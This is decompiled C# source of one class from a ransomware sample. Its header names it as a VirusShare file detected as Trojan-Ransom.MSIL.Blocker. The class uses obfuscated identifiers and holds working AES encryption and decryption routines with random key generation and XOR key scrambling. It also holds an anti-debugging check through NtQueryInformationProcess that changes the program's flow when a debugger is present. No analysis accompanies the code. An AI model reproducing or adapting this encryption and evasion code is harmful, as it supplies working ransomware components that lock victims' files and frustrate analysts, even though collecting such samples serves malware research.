// Decompiled with JetBrains decompiler
// Type: M6-n.>.)4>%
// Assembly: ]\r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 954C3D5E-708C-4DD0-82B7-DE2C5BD9F148
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b8539742a30b177b50768aa3e2c5af8a1f70cde6bd248fc157300ef1b9642f75.exe

using M\u000E6\u002Dn\u0008.\u0014\u003E;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace M\u000E6\u002Dn\u0008.\u0014\u003E
{
  internal class \u0029\u001D4\u003E\u0018\u000B\u0025
  {
    private static RijndaelManaged \u000B\u001B\u0026;

    static \u0029\u001D4\u003E\u0018\u000B\u0025()
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.Mode = CipherMode.CBC;
      rijndaelManaged.Padding = PaddingMode.Zeros;
      rijndaelManaged.KeySize = 128;
      rijndaelManaged.BlockSize = 128;
      rijndaelManaged.IV = new byte[16];
      \u0029\u001D4\u003E\u0018\u000B\u0025.\u000B\u001B\u0026 = rijndaelManaged;
    }

    public static byte[] \u0028\u000B\u001D\u0018\u0024B\u0028\u0020\u001F()
    {
      \u0029\u001D4\u003E\u0018\u000B\u0025.\u000B\u001B\u0026.GenerateKey();
      byte[] destinationArray = new byte[\u0029\u001D4\u003E\u0018\u000B\u0025.\u000B\u001B\u0026.Key.Length];
      Array.Copy((Array) \u0029\u001D4\u003E\u0018\u000B\u0025.\u000B\u001B\u0026.Key, 0, (Array) destinationArray, 0, \u0029\u001D4\u003E\u0018\u000B\u0025.\u000B\u001B\u0026.Key.Length);
      \u0029\u001D4\u003E\u0018\u000B\u0025.l\u003A`\u0005\u005D(ref destinationArray);
      return destinationArray;
    }

    public static void \u00132\u0025\u001C\u0004qPa(ref byte[] _param0)
    {
      try
      {
        using (ICryptoTransform encryptor = \u0029\u001D4\u003E\u0018\u000B\u0025.\u000B\u001B\u0026.CreateEncryptor())
          _param0 = encryptor.TransformFinalBlock(_param0, 0, _param0.Length);
      }
      catch
      {
      }
    }

    public static void \u009F\u0016\u0004\u002C\u002CU\u001C\u000F(ref byte[] _param0)
    {
      try
      {
        using (ICryptoTransform decryptor = \u0029\u001D4\u003E\u0018\u000B\u0025.\u000B\u001B\u0026.CreateDecryptor())
          _param0 = decryptor.TransformFinalBlock(_param0, 0, _param0.Length);
      }
      catch
      {
      }
    }

    private static void l\u003A`\u0005\u005D(ref byte[] _param0)
    {
      for (int index = 1; index < _param0.Length; ++index)
        _param0[index] ^= _param0[index - 1];
    }

    public static void \u0011S\u0021\u0011\u0021\u0007\u0023\u002AZ(ref byte[] _param0)
    {
      for (int index = _param0.Length - 1; index > 0; --index)
        _param0[index] ^= _param0[index - 1];
    }

    public static void \u001F\u0007\u0083y\u0007\u0015\u001B\u0005\u0007()
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      IntPtr handle = Process.GetCurrentProcess().Handle;
      \u0029\u001D4\u003E\u0018\u000B\u0025.\u007E\u0013(handle, 7, ref zero1, 4U, (object) null);
      \u0029\u001D4\u003E\u0018\u000B\u0025.\u007E\u0013(handle, 31, ref zero2, 4U, (object) null);
      if (!(zero1 != IntPtr.Zero) && !(zero2 == IntPtr.Zero))
        return;
      Assembly.GetCallingAssembly().GetModules()[0].Assembly.EntryPoint.Invoke((object) null, (object[]) null);
    }

    [DllImport("ntdll", EntryPoint = "NtQueryInformationProcess", CharSet = CharSet.Unicode)]
    private static extern bool \u007E\u0013(
      IntPtr _param0,
      int _param1,
      ref IntPtr _param2,
      uint _param3,
      object _param4);
  }
}
